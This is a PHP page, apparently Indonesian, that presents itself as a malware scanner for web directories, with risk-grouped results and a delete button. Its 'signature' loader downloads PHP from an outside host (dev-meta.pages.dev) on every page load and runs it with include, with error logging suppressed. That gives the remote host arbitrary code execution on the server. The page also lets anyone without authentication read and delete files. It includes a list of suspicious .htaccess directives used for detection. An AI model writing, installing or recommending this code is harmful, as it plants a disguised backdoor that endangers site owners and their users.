<?php
ini_set('log_errors', 0);
ini_set('display_errors', 0);

function load_signature_from_remote($url, $suffix) {
    $temp_file = sys_get_temp_dir() . '/scanner-signature'.$suffix.'.php';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 5
    ]);
    $code = curl_exec($ch);
    curl_close($ch);
    if (!$code || @file_put_contents($temp_file, $code) === false) return [];
    $signatures = @include $temp_file;
    return is_array($signatures) ? $signatures : [];
}

/* Clear signature cache */
if (isset($_GET['clear']) && $_GET['clear'] === '1') {
    $deleted = 0;
    for ($i=1; $i<=5; $i++) {
        $suffix = $i==1 ? '' : $i;
        $temp_file = sys_get_temp_dir() . '/scanner-signature'.$suffix.'.php';
        if (file_exists($temp_file)) {
            if (@unlink($temp_file)) $deleted++;
        }
    }
    $msg = $deleted ? "✅ $deleted signature cache dihapus." : "ℹ️ Tidak ada signature cache ditemukan.";
}

/* View file content */
if (isset($_GET['getfile'])) {
    $f = realpath($_GET['getfile']);
    if ($f && strpos($f,__DIR__)===0 && is_file($f)) {
        header("Content-Type: text/plain; charset=utf-8");
        readfile($f);
    } else {
        echo "File tidak bisa diakses.";
    }
    exit;
}

$htsig = ['RewriteRule','AddType application/x-httpd-php','FilesMatch','SetHandler','RedirectMatch','php_value auto_prepend_file'];

function extract_snippet($content, $regex, $max_length = 80) {
    if (preg_match($regex, $content, $matches, PREG_OFFSET_CAPTURE)) {
        $offset = $matches[0][1];
        $lines = explode("\n", $content);
        $char_count = 0;
        foreach ($lines as $i => $line) {
            $char_count += strlen($line) + 1;
            if ($char_count > $offset) {
                $snippet = 'Line '.($i+1).': '.trim($line);
                return strlen($snippet) > $max_length
                    ? substr($snippet, 0, $max_length) . '...'
                    : $snippet;
            }
        }
    }
    return '';
}

function match_multi_pattern($patterns, $content) {
    foreach ($patterns as $p) {
        if (!preg_match($p, $content)) return false;
    }
    return true;
}

function group_by_risk($php_results) {
    $grouped = ['high' => [], 'medium' => [], 'low' => []];
    foreach ($php_results as $item) {
        $risk = strtolower($item['risk']);
        if (!isset($grouped[$risk])) $grouped[$risk] = [];
        $grouped[$risk][] = $item;
    }
    return $grouped;
}

function scan($base, $patterns, $htsig, &$unreadable_dirs) {
    $r = ['php' => [], 'htaccess' => []];
    $stack = [$base];
    while ($stack) {
        $dir = array_pop($stack);
        if (!is_readable($dir)) { $unreadable_dirs[] = $dir; continue; }
        $files = @scandir($dir);
        if (!$files) { $unreadable_dirs[] = $dir; continue; }
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            if (is_dir($path)) { $stack[] = $path; continue; }
            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
            $b = basename($path);
            if ($ext === 'php') {
                if (($c = @file_get_contents($path)) !== false) {
                    foreach ($patterns as $pat) {
                        if (isset($pat['patterns']) && is_array($pat['patterns'])) {
                            if (match_multi_pattern($pat['patterns'], $c)) {
                                $snippet = extract_snippet($c, $pat['patterns'][0]);
                                $r['php'][] = ['path' => $path, 'type' => $pat['label'], 'risk' => $pat['risk'], 'snippet' => $snippet];
                                break;
                            }
                        } elseif (isset($pat['pattern'])) {
                            if (preg_match($pat['pattern'], $c)) {
                                $snippet = extract_snippet($c, $pat['pattern']);
                                $r['php'][] = ['path' => $path, 'type' => $pat['label'], 'risk' => $pat['risk'], 'snippet' => $snippet];
                                break;
                            }
                        }
                    }
                }
            }
            if ($b === '.htaccess') {
                if (($c = @file_get_contents($path)) !== false) {
                    foreach ($htsig as $x) {
                        if (stripos($c, $x) !== false) {
                            $r['htaccess'][] = ['path' => $path, 'type' => $x];
                            break;
                        }
                    }
                }
            }
        }
    }
    return $r;
}

$base_dir = __DIR__;
$scan_dir = isset($_GET['path']) ? trim($_GET['path']) : '';
$sig_choice = isset($_GET['sig']) ? (int)$_GET['sig'] : 1;
if ($sig_choice < 1 || $sig_choice > 5) $sig_choice = 1;
$suffix = $sig_choice == 1 ? '' : $sig_choice;
$signature_url = "https://dev-meta.pages.dev/meta-signature{$suffix}.php";

$patterns = load_signature_from_remote($signature_url, $suffix);

$real_scan_path = realpath($scan_dir);
$do_scan = isset($_GET['submit']) && $_GET['submit'] === '1';
if (!$real_scan_path || strpos($real_scan_path, $base_dir) !== 0) {
    $real_scan_path = '';
    $do_scan = false;
}

$delf = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['files'])) {
    foreach ($_POST['files'] as $f) {
        $r = realpath($f);
        if ($r && strpos($r, $base_dir) === 0 && file_exists($r)) {
            if (@unlink($r)) $delf[] = $r;
        }
    }
}

$unreadable_dirs = [];
$res = [];
if ($do_scan && $real_scan_path) {
    $res = scan($real_scan_path, $patterns, $htsig, $unreadable_dirs);
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Advanced PHP Scanner</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
<style>
body {
  background-color: #121212;
  color: #e0e0e0;
}
.container-fluid {
  background-color: #1e1e1e;
  padding: 20px;
  border-radius: 8px;
}
.table {
  table-layout: fixed;
  word-wrap: break-word;
  background-color: #1e1e1e;
  color: #ddd;
}
.table thead {
  background-color: #2a2a2a;
}
.table td, .table th {
  color: #ddd;
  vertical-align: middle;
}
.col-path { width: 35%; }
.col-snippet { width: 25%; }
.col-type { width: 10%; }
.col-risk { width: 10%; }
.col-action { width: 10%; }
.col-checkbox { width: 5%; }
.snippet {
  display: block;
  max-width: 100%;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
code, pre {
  background-color: #000;
  color: #0f0;
  padding: 2px 5px;
  border-radius: 4px;
}
.btn-danger { background-color: #d32f2f; border: none; }
.btn-warning { background-color: #f57c00; color: #fff; border: none; }
.btn-dark { background-color: #333; color: #fff; border: none; }
footer {
  background-color: #1e1e1e;
  color: #aaa !important;
  border-top: 1px solid #333;
}
@media (max-width: 768px) {
  #viewModal .modal-dialog {
    max-width: 100%;
    margin: 0;
  }
  #viewModal .modal-content {
    height: 100vh;
    border-radius: 0;
  }
}
pre#fileContent {
  white-space: pre-wrap;
  word-break: break-word;
}
</style>
</head>
<body class="p-3">

<div class="container-fluid">
  <h2 class="mb-4 text-center">🛡️ Advanced PHP Scanner (Dark)</h2>

  <?php if (!empty($msg)): ?>
  <div class="alert alert-info"><?=$msg?></div>
  <?php endif; ?>

  <a href="?clear=1" class="btn btn-warning mb-3">🧹 Clear Signature Cache</a>

  <form method="get" class="mb-4">
    <div class="row g-3">
      <div class="col-12 col-md-8">
        <label class="form-label">Direktori yang ingin discan:</label>
        <input type="text" name="path" class="form-control" placeholder="Contoh: ./themes" value="<?=htmlspecialchars($scan_dir)?>">
      </div>
      <div class="col-12 col-md-4">
        <label class="form-label">Pilih Signature:</label>
        <select name="sig" class="form-select">
          <?php for($i=1;$i<=5;$i++): ?>
            <option value="<?=$i?>" <?=$sig_choice==$i?'selected':''?>>Signature <?=$i?></option>
          <?php endfor; ?>
        </select>
      </div>
    </div>
    <input type="hidden" name="submit" value="1">
    <button class="btn btn-danger w-100 mt-3" type="submit">🚀 Mulai Scan</button>
  </form>

  <?php if ($delf): ?>
  <div class="alert alert-success"><?=count($delf)?> file dihapus.</div>
  <ul><?php foreach ($delf as $f) echo "<li>".htmlspecialchars($f)."</li>"; ?></ul>
  <?php endif; ?>

  <?php if ($do_scan && $real_scan_path): ?>
  <p><strong>Hasil scan direktori:</strong> <code><?=htmlspecialchars($real_scan_path)?></code> (Signature <?=$sig_choice?>)</p>

  <?php if (!empty($unreadable_dirs)): ?>
  <div class="alert alert-danger">📛 Direktori Tidak Bisa Diakses:</div>
  <ul><?php foreach ($unreadable_dirs as $dir) echo "<li>".htmlspecialchars($dir)."</li>"; ?></ul>
  <?php endif; ?>

  <?php if (empty($res['php']) && empty($res['htaccess'])): ?>
  <div class="alert alert-success"><strong>Tidak ada file mencurigakan ditemukan.</strong></div>
  <?php else: ?>
  <form method="POST">
  <?php
  $php_grouped = group_by_risk($res['php']);
  $risk_order = ['high', 'medium', 'low'];
  $risk_label = ['high' => '🔴 HIGH Risk', 'medium' => '🟠 MEDIUM Risk', 'low' => '⚪ LOW Risk'];

  foreach ($risk_order as $risk_level):
      $list = $php_grouped[$risk_level];
      if (!$list) continue;
  ?>
  <h4 class="mt-4"><?=$risk_label[$risk_level]?></h4>
  <div class="table-responsive">
  <table class="table table-bordered table-striped table-sm table-fixed">
    <thead><tr>
      <th class="col-checkbox"><input type="checkbox" onclick="selAll(this,'<?=$risk_level?>')"></th>
      <th class="col-type">Jenis</th>
      <th class="col-risk">Risk</th>
      <th class="col-path">Lokasi</th>
      <th class="col-snippet">Cuplikan</th>
      <th class="col-action">Aksi</th>
    </tr></thead><tbody>
    <?php foreach ($list as $idx => $e): ?>
    <tr>
      <td><input type="checkbox" name="files[]" value="<?=htmlspecialchars($e['path'])?>" class="cb-<?=$risk_level?>"></td>
      <td><?=htmlspecialchars($e['type'])?></td>
      <td><span class="fw-bold text-<?=$e['risk']=='high'?'danger':($e['risk']=='medium'?'warning':'secondary')?>"><?=strtoupper($e['risk'])?></span></td>
      <td style="word-break:break-all"><?=htmlspecialchars($e['path'])?></td>
      <td><code class="snippet"><?=htmlspecialchars($e['snippet'])?></code></td>
      <td>
        <button type="button" class="btn btn-sm btn-dark" data-bs-toggle="modal" data-bs-target="#viewModal" onclick="loadFile('<?=htmlspecialchars($e['path'])?>')">👁️ View</button>
      </td>
    </tr>
    <?php endforeach; ?></tbody>
  </table>
  </div>
  <?php endforeach; ?>

  <?php if (!empty($res['htaccess'])): ?>
  <h4 class="mt-4">📄 HTACCESS Files</h4>
  <div class="table-responsive">
  <table class="table table-bordered table-striped table-sm table-fixed">
    <thead><tr>
      <th><input type="checkbox" onclick="selAll(this,'htaccess')"></th>
      <th>Jenis</th><th>Lokasi</th>
    </tr></thead><tbody>
    <?php foreach ($res['htaccess'] as $e): ?>
    <tr>
      <td><input type="checkbox" name="files[]" value="<?=htmlspecialchars($e['path'])?>" class="cb-htaccess"></td>
      <td><?=htmlspecialchars($e['type'])?></td>
      <td style="word-break:break-all"><?=htmlspecialchars($e['path'])?></td>
    </tr>
    <?php endforeach; ?></tbody>
  </table>
  </div>
  <?php endif; ?>

  <button class="btn btn-danger w-100 mt-3" type="submit">🗑️ Hapus File Terpilih</button>
  </form>
  <?php endif; ?>
  <?php endif; ?>
</div>

<footer class="text-center text-muted py-3 mt-5 border-top">
  🛡️ Advanced PHP Scanner — © 2025 Meta69
</footer>

<div class="modal fade" id="viewModal" tabindex="-1">
  <div class="modal-dialog modal-lg">
    <div class="modal-content bg-dark text-light">
      <div class="modal-header">
        <h5 class="modal-title">Isi File</h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <pre id="fileContent" style="max-height:500px;overflow:auto;background:#000;color:#0f0;padding:10px"></pre>
      </div>
    </div>
  </div>
</div>

<script>
function selAll(c,t){let b=document.querySelectorAll('.cb-'+t);for(let i=0;i<b.length;i++)b[i].checked=c.checked;}
function loadFile(path){
  document.getElementById('fileContent').textContent="Loading...";
  fetch('?getfile='+encodeURIComponent(path))
    .then(r=>r.text())
    .then(txt=>document.getElementById('fileContent').textContent=txt);
}
</script>
</body>
</html>